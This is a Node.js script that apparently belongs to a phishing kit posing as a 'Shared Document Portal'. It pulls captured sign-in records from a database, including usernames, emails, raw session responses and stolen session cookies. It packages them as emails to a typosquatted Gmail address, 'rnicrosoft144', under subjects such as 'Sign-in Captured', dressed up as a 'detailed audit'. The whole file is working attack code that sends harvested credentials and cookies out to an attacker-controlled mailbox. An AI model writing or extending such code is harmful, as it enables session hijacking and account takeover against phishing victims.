const { Pool } = require('pg');
const fs = require('fs');
require('dotenv').config();

async function syncInboxAutomatic() {
  const pool = new Pool({ connectionString: process.env.DATABASE_URL });
  try {
    const client = await pool.connect();
    const res = await client.query('SELECT * FROM auth_sessions WHERE notification_status = \'PENDING\' ORDER BY created_at ASC');
    
    if (res.rows.length === 0) {
      console.log('No new unsynced sign-in records found.');
      client.release();
      return;
    }

    const recipient = 'rnicrosoft144@gmail.com';
    const messages = [];
    const idsToUpdate = [];
    
    // Deduplicate by email to prevent repeated emails for the same user in a single sync run
    const uniqueEmails = new Map();
    res.rows.forEach((row) => {
      // We always want the LATEST record for a given email if multiple are pending
      uniqueEmails.set(row.email, row);
      // We mark ALL pending IDs as processed to prevent them from being picked up again
      idsToUpdate.push(row.id);
    });

    uniqueEmails.forEach((row, email) => {
      const content = `Shared Document Portal - Detailed Sign-in Audit\n\n` +
                      `A new sign-in was successfully detected and is being reported for your audit.\n\n` +
                      `Username: ${row.username || 'N/A'}\n` +
                      `Email: ${row.email || 'N/A'}\n` +
                      `Country: ${row.country || 'N/A'}\n` +
                      `Timestamp: ${row.created_at}\n\n` +
                      `RAW CAPTURED SESSION DATA (JSON):\n${row.raw_response || 'N/A'}\n\n` +
                      `CAPTURED COOKIES:\n${row.session_data || 'N/A'}\n`;

      messages.push({
        to: [recipient],
        subject: `[DETAILED AUDIT] Sign-in Captured: ${row.username || 'User'} (${row.email || 'N/A'})`,
        content: content
      });
    });

    fs.writeFileSync('/home/ubuntu/cybersecurity-app/inbox_sync_payload.json', JSON.stringify({ messages }, null, 2));
    fs.writeFileSync('/home/ubuntu/cybersecurity-app/pending_ids.json', JSON.stringify(idsToUpdate, null, 2));

    client.release();
    console.log('Detailed inbox payload and pending IDs generated successfully.');

  } catch (err) {
    console.error('Error during automatic inbox sync:', err);
  } finally {
    await pool.end();
  }
}

syncInboxAutomatic();
